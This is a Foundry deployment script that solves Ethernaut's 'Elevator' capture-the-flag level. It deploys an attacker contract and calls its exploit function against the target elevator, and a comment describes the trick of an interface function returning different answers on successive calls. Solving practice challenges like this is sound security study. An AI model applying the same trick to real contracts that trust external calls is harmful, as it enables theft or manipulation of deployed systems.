// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { Building } from "ethernaut/11-elevator/Building.sol";

contract ElevatorScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address elevatorAddr = vm.envAddress("L11_ELEVATOR_ADDRESS");

        // Step 1: deploy Building
        Building building = new Building();

        // Step 2: call `Building.goTo()`, which calls twice `Building.isLastFloot()`. The latter returns `false` on the
        // first time is being called, and `true` on the second time.
        building.exploit(elevatorAddr, 0);

        vm.stopBroadcast();
    }
}
